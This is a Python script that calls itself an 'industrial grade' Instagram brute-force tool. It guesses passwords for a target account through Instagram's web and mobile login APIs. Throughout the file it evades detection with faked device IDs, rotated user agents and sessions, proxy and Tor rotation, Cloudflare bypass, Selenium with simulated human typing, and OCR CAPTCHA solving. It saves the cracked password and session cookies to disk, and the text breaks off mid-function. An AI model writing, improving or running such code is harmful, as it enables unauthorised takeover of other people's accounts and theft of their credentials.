# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Instagram Brute Force Script
A script for brute force attacks on Instagram accounts.
"""

import os
import sys
import time
import random
import requests
import json
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor
import socket
import urllib3
import itertools
import base64
import hashlib
from urllib.parse import quote
import ssl
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None
try:
    import cloudscraper
except (ImportError, ModuleNotFoundError):
    cloudscraper = None
    print("⚠️  Cloudscraper module not available - install with pip install cloudscraper")
try:
    import asyncio
    import aiohttp
    import asyncssh
except ImportError:
    asyncio = aiohttp = asyncssh = None

# Additional advanced modules
try:
    # Temporarily disable TOR/SOCKS to avoid IPv6 issues
    # import socks
    # import stem
    # from stem import Signal
    # from stem.control import Controller
    socks = stem = Signal = Controller = None
except ImportError:
    socks = stem = Signal = Controller = None

try:
    import undetected_chromedriver as uc
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
except ImportError:
    uc = webdriver = By = WebDriverWait = EC = None

try:
    import captcha_solver
    import pytesseract
    from PIL import Image
except ImportError:
    captcha_solver = pytesseract = Image = None

try:
    import psutil
    import subprocess
    import platform
except ImportError:
    psutil = subprocess = platform = None


class AdvancedInstagramBruteForcer:
    """Advanced Instagram Brute Force Attack Class - Industrial Grade"""

    def __init__(self, target_username, password_list, proxy_list=None, use_tor=False):
        self.target_username = target_username
        self.password_list = password_list
        # Disable proxy loading to avoid IPv6/PySocks issues
        self.proxy_list = [] if not proxy_list else proxy_list
        self.found_password = None
        self.use_tor = use_tor
        self.rate_limit_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.checkpoint_count = 0

        # Stealth features - Initialize before session creation
        self.use_cloudflare_bypass = True
        self.use_residential_proxies = True
        self.rotate_sessions = True

        # Advanced session management
        self.sessions = []
        self.session_pool_size = 50
        self.create_session_pool()

        # User agent rotation
        self.ua = None
        try:
            if UserAgent:
                self.ua = UserAgent()
        except Exception:
            pass

        self.mobile_agents = [
            'Instagram 274.0.0.18.75 Android (29/10; 420dpi; 1080x2280; Xiaomi; Mi 9T; davinci; qcom; ru_RU; 436384447)',
            'Instagram 274.0.0.18.75 Android (28/9; 320dpi; 720x1520; samsung; SM-A750F; a7y18lte; exynos7885; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (30/11; 560dpi; 1440x3040; samsung; SM-G973F; beyond1; exynos9820; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (29/10; 480dpi; 1080x2340; OnePlus; GM1903; OnePlus7; qcom; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (28/9; 480dpi; 1080x2160; Huawei; ANE-LX1; HWANE; kirin710; en_US; 436384447)'
        ]

        self.web_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/118.0',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'
        ]

        # Advanced attack patterns
        self.attack_modes = ['web', 'mobile_api', 'hybrid']
        self.current_mode = 'hybrid'

        # Smart rate limiting
        self.min_delay = 0.5
        self.max_delay = 3.0
        self.adaptive_delay = 1.0

        # Stealth features
        self.use_cloudflare_bypass = True
        self.use_residential_proxies = True
        self.rotate_sessions = True

    def get_advanced_headers(self, mode='web'):
        """Generate advanced headers with fingerprint evasion"""
        base_headers = {
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9',
                'es-ES,es;q=0.9',
                'fr-FR,fr;q=0.9',
                'de-DE,de;q=0.9'
            ]),
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        }

        if mode == 'mobile_api':
            # Instagram mobile app headers
            headers = {
                'User-Agent': random.choice(self.mobile_agents),
                'X-IG-App-ID': '124024574287414',
                'X-IG-Android-ID': self.generate_android_id(),
                'X-IG-Device-ID': self.generate_device_id(),
                'X-IG-Family-Device-ID': self.generate_device_id(),
                'X-Mid': self.generate_mid(),
                'Accept': '*/*',
                'Accept-Language': 'en-US',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
        else:
            # Web headers
            headers = base_headers.copy()
            if self.ua:
                try:
                    headers['User-Agent'] = self.ua.random
                except:
                    headers['User-Agent'] = random.choice(self.web_agents)
            else:
                headers['User-Agent'] = random.choice(self.web_agents)

        return headers

    def generate_android_id(self):
        """Generate realistic Android ID"""
        return 'android-' + ''.join(random.choices('0123456789abcdef', k=16))

    def generate_device_id(self):
        """Generate realistic device ID"""
        return str(random.randint(10**20, 10**21 - 1))

    def generate_mid(self):
        """Generate machine ID"""
        return base64.b64encode(os.urandom(16)).decode().replace('=', '').replace('+', '-').replace('/', '_')

    def get_csrf_token(self, session, mode='web'):
        """Get CSRF token with multiple fallback methods"""
        try:
            headers = self.get_advanced_headers(mode)
            proxies = self.get_proxy()

            if mode == 'mobile_api':
                # Try mobile API endpoint
                response = session.get(
                    'https://i.instagram.com/api/v1/si/fetch_headers/',
                    headers=headers,
                    proxies=proxies,
                    timeout=15
                )
                if response.status_code == 200:
                    return response.headers.get('X-CSRFToken')

            # Fallback to web method
            response = session.get(
                'https://www.instagram.com/accounts/login/',
                headers=headers,
                proxies=proxies,
                timeout=15
            )

            # Multiple extraction methods
            csrf_methods = [
                lambda text: text.split('"csrf_token":"')[1].split(
                    '"')[0] if '"csrf_token":"' in text else None,
                lambda text: text.split('csrftoken=')[1].split(
                    ';')[0] if 'csrftoken=' in text else None,
                lambda text: text.split('"token":"')[1].split(
                    '"')[0] if '"token":"' in text else None
            ]

            for method in csrf_methods:
                try:
                    token = method(response.text)
                    if token:
                        return token
                except:
                    continue

            # Extract from cookies
            csrf_cookie = session.cookies.get('csrftoken')
            if csrf_cookie:
                return csrf_cookie

        except Exception as e:
            print(f"⚠️  CSRF token error: {e}")
        return None

    def attempt_login_advanced(self, password, attempt_number=0):
        """Advanced login attempt with multiple attack vectors"""
        session = self.get_session()

        # Adaptive attack mode selection
        if attempt_number % 3 == 0:
            mode = 'mobile_api'
        elif attempt_number % 3 == 1:
            mode = 'web'
        else:
            mode = 'hybrid'

        try:
            # Smart delay with adaptive adjustment
            delay = random.uniform(
                self.min_delay, self.max_delay) + self.adaptive_delay
            time.sleep(delay)

            # Get CSRF token
            csrf_token = self.get_csrf_token(session, mode)
            if not csrf_token:
                print(f"⚠️  No CSRF token for {password}")
                return False

            # Prepare login data based on mode
            if mode == 'mobile_api':
                success = self.mobile_api_login(session, password, csrf_token)
            else:
                success = self.web_login(session, password, csrf_token)

            if success is None:
                # Rate limited - increase delay
                self.adaptive_delay = min(self.adaptive_delay * 1.5, 10.0)
                self.rate_limit_count += 1
                print(
                    f"⏳ Rate limited! Adaptive delay: {self.adaptive_delay:.1f}s")
                return False
            elif success:
                self.found_password = password
                self.success_count += 1
                return True
            else:
                self.failed_count += 1
                # Reduce delay on successful request
                self.adaptive_delay = max(
                    self.adaptive_delay * 0.95, self.min_delay)
                return False

        except Exception as e:
            print(f"💥 Critical error with {password}: {e}")
            return False

    def mobile_api_login(self, session, password, csrf_token):
        """Mobile API login attempt"""
        headers = self.get_advanced_headers('mobile_api')
        headers['X-CSRFToken'] = csrf_token

        # Generate realistic mobile login data
        login_data = {
            'username': self.target_username,
            'password': password,
            'device_id': self.generate_android_id(),
            'login_attempt_account_recovery_allowed': 'true',
            '_uuid': self.generate_device_id(),
            'phone_id': self.generate_device_id(),
            '_csrftoken': csrf_token,
            'login_attempt_count': str(random.randint(0, 2))
        }

        # Encode data like Instagram mobile app
        signed_body = self.generate_signed_body(login_data)

        try:
            response = session.post(
                'https://i.instagram.com/api/v1/accounts/login/',
                data=signed_body,
                headers=headers,
                proxies=self.get_proxy(),
                timeout=20
            )

            return self.analyze_response(response, password, 'mobile')

        except Exception as e:
            print(f"📱 Mobile API error: {e}")
            return False

    def web_login(self, session, password, csrf_token):
        """Web login attempt"""
        headers = self.get_advanced_headers('web')
        headers.update({
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://www.instagram.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        })

        # Create encrypted password format (2025 version)
        timestamp = int(time.time())
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"

        login_data = {
            'username': self.target_username,
            'enc_password': enc_password,  # Use encrypted password format
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
            'stopDeletionNonce': '',
            'queryParams': '{}'
        }

        try:
            response = session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                proxies=self.get_proxy(),
                timeout=20
            )

            return self.analyze_response(response, password, 'web')

        except Exception as e:
            print(f"🌐 Web error: {e}")
            return False

    def generate_signed_body(self, data):
        """Generate signed body for mobile API (simplified)"""
        json_data = json.dumps(data)
        return f'signed_body={quote(json_data)}&ig_sig_key_version=4'

    def analyze_response(self, response, password, method):
        """Analyze login response with advanced detection"""
        status_code = response.status_code
        text = response.text.lower()

        # Check if user exists
        user_not_exist_indicators = [
            'user not found',
            'username not found',
            'no user',
            'not exist',
            'not found',
            'invalid username',
        ]

        # Don't check username exists in first login attempts - Instagram provides false negatives
        if self.success_count < 1 and self.failed_count < 3:
            pass  # Skip existence check in first attempts
        elif any(indicator in text for indicator in user_not_exist_indicators):
            print(
                f"❌ User {self.target_username} exists but not found on first attempt - continuing")
            # Don't fail here, continue trying

        # Success indicators
        success_indicators = [
            'authenticated',
            '"status":"ok"',
            'logged_in_user',
            'sessionid'
        ]

        # Rate limit indicators
        rate_limit_indicators = [
            'rate_limited',
            'please wait',
            'too many requests',
            'spam',
            'try again later'
        ]

        # Checkpoint indicators
        checkpoint_indicators = [
            'checkpoint_required',
            'challenge_required',
            'two_factor_required',
            'verification'
        ]

        # HTTP 400 Bad Request handling (new)
        if status_code == 400:
            print(f"⚠️ [{method.upper()}] HTTP 400 Bad Request for: {password}")
            self.debug_request(response, password)
            # Sleep a bit longer for HTTP 400 errors
            time.sleep(random.uniform(3.0, 5.0))
            return False

        # Check for success
        if any(indicator in text for indicator in success_indicators):
            print(f"🎯 [{method.upper()}] SUCCESS! Password: {password}")
            self.save_success(password, method, response)
            return True

        # Check for rate limiting
        if status_code == 429 or any(indicator in text for indicator in rate_limit_indicators):
            print(f"⏳ [{method.upper()}] Rate limited for: {password}")
            return None

        # Check for checkpoint
        if any(indicator in text for indicator in checkpoint_indicators):
            print(f"🔒 [{method.upper()}] Checkpoint for: {password}")
            self.checkpoint_count += 1
            self.save_checkpoint(password, method, response)
            return False

        # Regular failure
        print(f"❌ [{method.upper()}] Failed: {password}")
        return False

    def debug_request(self, response, password):
        """Debug request details when HTTP 400 or other errors occur"""
        print(f"\n🔍 DEBUG HTTP {response.status_code} - Password: {password}")
        print(f"📊 Status Code: {response.status_code}")
        print(f"📝 Response Headers: {dict(response.headers)}")

        try:
            # Show only first 500 characters
            response_text = response.text[:500]
            print(f"📄 Response Body: {response_text}")

            # Try to parse as JSON if possible
            if response.headers.get('content-type', '').startswith('application/json'):
                try:
                    response_data = response.json()
                    print(f"📋 JSON Response: {response_data}")
                except json.JSONDecodeError:
                    print("⚠️ Content-type says JSON but couldn't parse JSON")

        except Exception as e:
            print(f"⚠️ Cannot show response body: {e}")

    def save_success(self, password, method, response):
        """Save successful login details"""
        success_data = {
            'username': self.target_username,
            'password': password,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'cookies': dict(response.cookies),
            'response_headers': dict(response.headers)
        }

        os.makedirs('logs', exist_ok=True)
        with open(f'logs/success_{self.target_username}.json', 'w') as f:
            json.dump(success_data, f, indent=2)

    def save_checkpoint(self, password, method, response):
        """Save checkpoint details for manual bypass"""
        checkpoint_data = {
            'username': self.target_username,
            'password': password,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'response_text': response.text[:1000]  # First 1000 chars
        }

        os.makedirs('logs', exist_ok=True)
        with open(f'logs/checkpoints_{self.target_username}.json', 'a') as f:
            f.write(json.dumps(checkpoint_data) + '\n')

    def hardcore_brute_force_attack(self, max_threads=10, smart_mode=True):
        """Hardcore brute force attack with all advanced features"""
        print(f"💀 HARDCORE INSTAGRAM BRUTE FORCE ATTACK")
        print(f"🎯 Target: {self.target_username}")
        print(f"🔢 Passwords: {len(self.password_list):,}")
        print(f"🧵 Threads: {max_threads}")
        print(f"🌐 Proxies: {len(self.proxy_list):,}")
        print(f"🔄 Sessions: {len(self.sessions)}")
        print(f"🧠 Smart Mode: {'ON' if smart_mode else 'OFF'}")
        print("=" * 60)

        # Smart password ordering
        if smart_mode:
            self.password_list = self.smart_password_ordering()

        start_time = time.time()
        attempt_number = 0

        # Create logs directory
        os.makedirs('logs', exist_ok=True)

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []

            for password in self.password_list:
                if self.found_password:
                    print(f"\n🎉 TERMINATING - PASSWORD FOUND!")
                    break

                future = executor.submit(
                    self.attempt_login_advanced, password, attempt_number)
                futures.append((future, password, attempt_number))
                attempt_number += 1

                # Progress reporting
                if attempt_number % 50 == 0:
                    self.print_progress_stats(attempt_number, start_time)

                # Dynamic thread adjustment
                if smart_mode and attempt_number % 100 == 0:
                    max_threads = self.adjust_thread_count(max_threads)

            # Wait for all futures
            for future, password, num in futures:
                if self.found_password:
                    break
                try:
                    future.result(timeout=30)
                except Exception as e:
                    print(f"⚠️  Future error for {password}: {e}")

        self.print_final_results(start_time)
        return self.found_password is not None

    def smart_password_ordering(self):
        """Smart password ordering based on common patterns"""
        print("🧠 Applying smart password ordering...")

        # Common password patterns with priorities
        high_priority = []
        medium_priority = []
        low_priority = []

        username_variations = [
            self.target_username,
            self.target_username + '123',
            self.target_username + '1',
            self.target_username + '2024',
            self.target_username + '2025',
            '123' + self.target_username,
            self.target_username.upper(),
            self.target_username.lower()
        ]

        common_patterns = [
            'password', '123456', 'password123', 'admin', 'qwerty',
            'letmein', 'welcome', 'monkey', 'dragon', 'master'
        ]

        for password in self.password_list:
            pwd_lower = password.lower()

            # High priority: username variations
            if password in username_variations:
                high_priority.append(password)
            # High priority: very common passwords
            elif pwd_lower in ['123456', 'password', 'qwerty', '123456789']:
                high_priority.append(password)
            # Medium priority: contains username or common patterns
            elif any(pattern in pwd_lower for pattern in [self.target_username.lower()] + common_patterns):
                medium_priority.append(password)
            # Medium priority: simple patterns
            elif len(password) <= 8 and (password.isdigit() or password.isalpha()):
                medium_priority.append(password)
            else:
                low_priority.append(password)

        # Shuffle within categories to avoid patterns
        random.shuffle(high_priority)
        random.shuffle(medium_priority)
        random.shuffle(low_priority)

        ordered_passwords = high_priority + medium_priority + low_priority
        print(
            f"🎯 Ordered: {len(high_priority)} high, {len(medium_priority)} medium, {len(low_priority)} low priority")

        return ordered_passwords

    def adjust_thread_count(self, current_threads):
        """Dynamically adjust thread count based on performance"""
        if self.rate_limit_count > 10:
            new_threads = max(1, current_threads - 2)
            print(f"🔽 Reducing threads: {current_threads} → {new_threads}")
            return new_threads
        elif self.rate_limit_count == 0 and current_threads < 20:
            new_threads = current_threads + 1
            print(f"🔼 Increasing threads: {current_threads} → {new_threads}")
            return new_threads
        return current_threads

    def print_progress_stats(self, attempt_number, start_time):
        """Print detailed progress statistics"""
        elapsed = time.time() - start_time
        rate = attempt_number / elapsed if elapsed > 0 else 0

        print(f"\n� PROGRESS STATS:")
        print(f"   Attempts: {attempt_number:,}/{len(self.password_list):,}")
        print(
            f"   Success: {self.success_count} | Failed: {self.failed_count} | Checkpoints: {self.checkpoint_count}")
        print(
            f"   Rate Limits: {self.rate_limit_count} | Speed: {rate:.1f} attempts/sec")
        print(
            f"   Elapsed: {elapsed/60:.1f}m | Adaptive Delay: {self.adaptive_delay:.1f}s")

    def print_final_results(self, start_time):
        """Print final attack results"""
        elapsed = time.time() - start_time
        total_attempts = self.success_count + self.failed_count + self.checkpoint_count

        print(f"\n� HARDCORE ATTACK COMPLETED!")
        print(f"⏱️  Total Time: {elapsed/60:.1f} minutes")
        print(f"🎯 Total Attempts: {total_attempts:,}")
        print(f"✅ Success: {self.success_count}")
        print(f"❌ Failed: {self.failed_count}")
        print(f"🔒 Checkpoints: {self.checkpoint_count}")
        print(f"⏳ Rate Limits: {self.rate_limit_count}")

        if self.found_password:
            print(f"\n🎉 PWNED! Password: {self.found_password}")
            print(
                f"📁 Details saved in: logs/success_{self.target_username}.json")
        else:
            print(f"\n💔 Target survived the assault")

        if self.checkpoint_count > 0:
            print(
                f"🔒 Checkpoint accounts saved in: logs/checkpoints_{self.target_username}.json")

    def load_proxies(self):
        """Load proxies from multiple sources"""
        print("🌐 Loading proxies from multiple sources...")
        proxies = []
        proxy_sources = [
            'proxy_list.txt',
            '../proxy_list.txt',
            'config/proxies.json',
            'free_configs/proxies.txt'
        ]

        for source in proxy_sources:
            try:
                if source.endswith('.json'):
                    with open(source, 'r') as f:
                        data = json.load(f)
                        new_proxies = data.get('proxies', [])
                        proxies.extend(new_proxies)
                        print(
                            f"   Loaded {len(new_proxies)} proxies from {source}")
                else:
                    with open(source, 'r') as f:
                        new_proxies = [line.strip()
                                       for line in f if line.strip()]
                        proxies.extend(new_proxies)
                        print(
                            f"   Loaded {len(new_proxies)} proxies from {source}")
            except Exception as e:
                print(f"   Failed to load {source}: {e}")
                continue

        # Add some free proxy APIs
        try:
            free_proxies = self.fetch_free_proxies()
            proxies.extend(free_proxies)
        except Exception as e:
            print(f"⚠️  Failed to fetch free proxies: {e}")

        unique_proxies = list(set(proxies))  # Remove duplicates
        print(f"✅ Total unique proxies loaded: {len(unique_proxies)}")
        return unique_proxies

    def fetch_free_proxies(self):
        """Fetch free proxies from public APIs"""
        proxies = []
        try:
            print("🌐 Fetching free proxies...")
            # ProxyList API
            response = requests.get(
                'https://www.proxy-list.download/api/v1/get?type=http', timeout=10)
            if response.status_code == 200:
                new_proxies = response.text.strip().split('\n')
                proxies.extend([p for p in new_proxies if p.strip()])
                print(
                    f"   Found {len(new_proxies)} proxies from proxy-list.download")
        except Exception as e:
            print(f"⚠️  Failed to fetch free proxies: {e}")
        return proxies

    def create_session_pool(self):
        """Create a pool of sessions for rotation"""
        print("🔄 Creating session pool...")
        for i in range(self.session_pool_size):
            try:
                session = self.create_advanced_session()
                self.sessions.append(session)
                if i % 10 == 0:
                    print(
                        f"   Created {i+1}/{self.session_pool_size} sessions...")
            except Exception as e:
                print(f"⚠️  Failed to create session {i+1}: {e}")
                # Create a basic session as fallback
                session = requests.Session()
                self.sessions.append(session)

        print(f"✅ Session pool ready: {len(self.sessions)} sessions")

    def create_advanced_session(self):
        """Create an advanced session with stealth features"""
        session = requests.Session()

        # Try to use cloudscraper if available
        if self.use_cloudflare_bypass and cloudscraper:
            try:
                # Fix browser parameters for cloudscraper
                browser_params = {
                    'browser': 'chrome',
                    'platform': random.choice(['windows', 'darwin']),
                    'desktop': True
                }
                # Create with simpler parameters to avoid errors
                session = cloudscraper.create_scraper(
                    browser=browser_params,
                    delay=10
                )
            except Exception as e:
                print(f"⚠️  Cloudscraper failed, using standard session: 'chrome'")
                session = requests.Session()

        # Advanced retry strategy
        try:
            retry_strategy = Retry(
                total=3,
                backoff_factor=1,
                status_forcelist=[429, 500, 502, 503, 504],
            )

            adapter = HTTPAdapter(max_retries=retry_strategy,
                                  pool_connections=100, pool_maxsize=100)
            session.mount("http://", adapter)
            session.mount("https://", adapter)
        except Exception as e:
            print(f"⚠️  Retry strategy setup failed: {e}")

        # Disable SSL warnings
        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            session.verify = False
        except Exception:
            pass

        return session

    def get_session(self):
        """Get a random session from pool"""
        if self.rotate_sessions and self.sessions:
            return random.choice(self.sessions)
        return self.sessions[0] if self.sessions else requests.Session()

    def get_proxy(self):
        """Get a random proxy - disabled to avoid IPv6 issues"""
        return None

    def get_network_info(self):
        """Get network and system information for advanced fingerprinting"""
        try:
            info = {
                'platform': platform.system() if platform else 'Unknown',
                'hostname': socket.gethostname() if socket else 'Unknown',
                'ip_info': self.get_external_ip(),
                'user_agent_entropy': self.calculate_ua_entropy(),
                'ssl_fingerprint': self.get_ssl_fingerprint()
            }
            return info
        except Exception as e:
            print(f"⚠️  Network info error: {e}")
            return {}

    def get_external_ip(self):
        """Get external IP address"""
        try:
            response = requests.get(
                'https://api.ipify.org?format=json', timeout=5)
            return response.json().get('ip', 'Unknown')
        except:
            return 'Unknown'

    def calculate_ua_entropy(self):
        """Calculate user agent entropy for better randomization"""
        if not self.ua:
            return 0
        try:
            ua_string = str(self.ua.random)
            entropy = len(set(ua_string)) / len(ua_string) if ua_string else 0
            return round(entropy, 3)
        except:
            return 0

    def get_ssl_fingerprint(self):
        """Generate SSL fingerprint"""
        try:
            context = ssl.create_default_context()
            return hashlib.md5(str(context.get_ca_certs()).encode()).hexdigest()[:16]
        except:
            return 'unknown'

    def create_hash_chain(self, data):
        """Create hash chain for password verification"""
        try:
            hash_obj = hashlib.sha256(str(data).encode())
            return hash_obj.hexdigest()
        except:
            return None

    def generate_password_combinations(self, base_password, max_combinations=50):
        """Generate advanced password combinations using itertools"""
        if not itertools:
            return [base_password]

        try:
            combinations = []

            # Character substitutions
            substitutions = {
                'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'
            }

            # Generate substitution combinations
            chars = list(base_password.lower())
            for combo in itertools.product(*[[c, substitutions.get(c, c)] for c in chars]):
                new_password = ''.join(combo)
                if new_password != base_password:
                    combinations.append(new_password)
                if len(combinations) >= max_combinations:
                    break

            return combinations[:max_combinations]
        except Exception as e:
            print(f"⚠️  Password combination error: {e}")
            return [base_password]

    def setup_tor_connection(self):
        """Setup TOR connection for advanced anonymity"""
        print("⚠️  TOR modules disabled to avoid IPv6 issues")
        return False

    def rotate_tor_identity(self):
        """Rotate TOR identity for new IP"""
        if not Controller:
            return False

        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                print("🔄 TOR identity rotated")
                return True
        except Exception as e:
            print(f"⚠️  TOR rotation failed: {e}")
            return False

    async def async_login_attempt(self, session, password, csrf_token, mode='web'):
        """Asynchronous login attempt for better performance"""
        if not aiohttp:
            return await self.sync_to_async_wrapper(self.web_login, session, password, csrf_token)

        try:
            headers = self.get_advanced_headers(mode)
            headers.update({
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Content-Type': 'application/x-www-form-urlencoded'
            })

            login_data = {
                'username': self.target_username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }

            async with aiohttp.ClientSession() as async_session:
                async with async_session.post(
                    'https://www.instagram.com/accounts/login/ajax/',
                    data=login_data,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=20)
                ) as response:
                    text = await response.text()
                    return self.analyze_response_text(text, password, mode)

        except Exception as e:
            print(f"🔄 Async error with {password}: {e}")
            return False

    async def sync_to_async_wrapper(self, func, *args):
        """Wrapper to run sync functions in async context"""
        if not asyncio:
            return func(*args)

        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, func, *args)

    def analyze_response_text(self, text, password, method):
        """Analyze response text without response object"""
        text_lower = text.lower()

        # Success indicators
        success_indicators = [
            'authenticated', '"status":"ok"', 'logged_in_user', 'sessionid'
        ]

        # Rate limit indicators
        rate_limit_indicators = [
            'rate_limited', 'please wait', 'too many requests', 'spam', 'try again later'
        ]

        # Checkpoint indicators
        checkpoint_indicators = [
            'checkpoint_required', 'challenge_required', 'two_factor_required', 'verification'
        ]

        # Check for success
        if any(indicator in text_lower for indicator in success_indicators):
            print(f"🎯 [{method.upper()}] SUCCESS! Password: {password}")
            return True

        # Check for rate limiting
        if any(indicator in text_lower for indicator in rate_limit_indicators):
            print(f"⏳ [{method.upper()}] Rate limited for: {password}")
            return None

        # Check for checkpoint
        if any(indicator in text_lower for indicator in checkpoint_indicators):
            print(f"🔒 [{method.upper()}] Checkpoint for: {password}")
            self.checkpoint_count += 1
            return False

        # Regular failure
        print(f"❌ [{method.upper()}] Failed: {password}")
        return False

    def get_system_resources(self):
        """Monitor system resources for performance optimization"""
        if not psutil:
            return {}

        try:
            return {
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory_percent': psutil.virtual_memory().percent,
                'disk_usage': psutil.disk_usage('/').percent,
                'network_io': psutil.net_io_counters()._asdict() if psutil.net_io_counters() else {}
            }
        except Exception as e:
            print(f"⚠️  Resource monitoring error: {e}")
            return {}

    def optimize_performance(self):
        """Optimize performance based on system resources"""
        resources = self.get_system_resources()

        if resources.get('cpu_percent', 0) > 80:
            self.adaptive_delay *= 1.2
            print("🔽 High CPU usage - increasing delay")
        elif resources.get('cpu_percent', 0) < 30:
            self.adaptive_delay *= 0.9
            print("🔼 Low CPU usage - decreasing delay")

        if resources.get('memory_percent', 0) > 85:
            print("⚠️  High memory usage detected")

        return resources

    def selenium_login_attempt(self, password):
        """Selenium-based login for bypassing advanced detection"""
        if not uc or not webdriver:
            print("⚠️  Selenium modules not available")
            return False

        try:
            options = uc.ChromeOptions()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')

            # Random user agent
            ua = random.choice(self.web_agents)
            options.add_argument(f'--user-agent={ua}')

            driver = uc.Chrome(options=options)

            try:
                driver.get('https://www.instagram.com/accounts/login/')
                time.sleep(random.uniform(2, 4))

                # Wait for elements
                username_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "username"))
                )
                password_input = driver.find_element(By.NAME, "password")

                # Human-like typing
                self.human_type(username_input, self.target_username)
                time.sleep(random.uniform(0.5, 1.5))
                self.human_type(password_input, password)
                time.sleep(random.uniform(1, 2))

                # Submit
                login_button = driver.find_element(
                    By.XPATH, "//button[@type='submit']")
                login_button.click()

                # Wait for response
                time.sleep(random.uniform(3, 5))

                # Check for success indicators
                current_url = driver.current_url
                page_source = driver.page_source.lower()

                success_indicators = ['instagram.com/' +
                                      self.target_username, 'feed', 'home']
                if any(indicator in current_url.lower() for indicator in success_indicators):
                    print(f"🎯 [SELENIUM] SUCCESS! Password: {password}")
                    return True
                elif 'challenge' in current_url or 'checkpoint' in page_source:
                    print(f"🔒 [SELENIUM] Checkpoint for: {password}")
                    self.checkpoint_count += 1
                    return False
                else:
                    print(f"❌ [SELENIUM] Failed: {password}")
                    return False

            finally:
                driver.quit()

        except Exception as e:
            print(f"🌐 Selenium error with {password}: {e}")
            return False

    def human_type(self, element, text):
        """Simulate human typing patterns"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.15))

    def solve_captcha(self, captcha_image_path):
        """Solve CAPTCHA using OCR or external service"""
        if not pytesseract or not Image:
            print("⚠️  CAPTCHA solving modules not available")
            return None

        try:
            image = Image.open(captcha_image_path)
            text = pytesseract.image_to_string(image)
            return text.strip()
        except Exception as e:
            print(f"⚠️  CAPTCHA solving error: {e}")
            return None

    def enhanced_proxy_check(self, proxy):
        """Enhanced proxy validation with multiple endpoints"""
        test_urls = [
            'https://httpbin.org/ip',
            'https://api.ipify.org?format=json',
            'https://www.instagram.com'
        ]

        proxy_dict = {'http': proxy, 'https': proxy}

        for url in test_urls:
            try:
                response = requests.get(url, proxies=proxy_dict, timeout=10)
                if response.status_code == 200:
                    return True
            except:
                continue
        return False

    def smart_proxy_rotation(self):
        """Smart proxy rotation based on success rate"""
        working_proxies = []

        print("🔍 Validating proxies...")
        for proxy in self.proxy_list[:20]:  # Test first 20 proxies
            if self.enhanced_proxy_check(proxy):
                working_proxies.append(proxy)
                print(f"✅ Working proxy: {proxy}")
            else:
                print(f"❌ Dead proxy: {proxy}")

        self.proxy_list = working_proxies
        print(f"✅ Validated {len(working_proxies)} working proxies")

    def generate_device_fingerprint(self):
        """Generate realistic device fingerprint"""
        fingerprint = {
            'screen_resolution': random.choice(['1920x1080', '1366x768', '1440x900', '1536x864']),
            'timezone': random.choice(['-8', '-5', '0', '+1', '+8']),
            'language': random.choice(['en-US', 'en-GB', 'es-ES', 'fr-FR']),
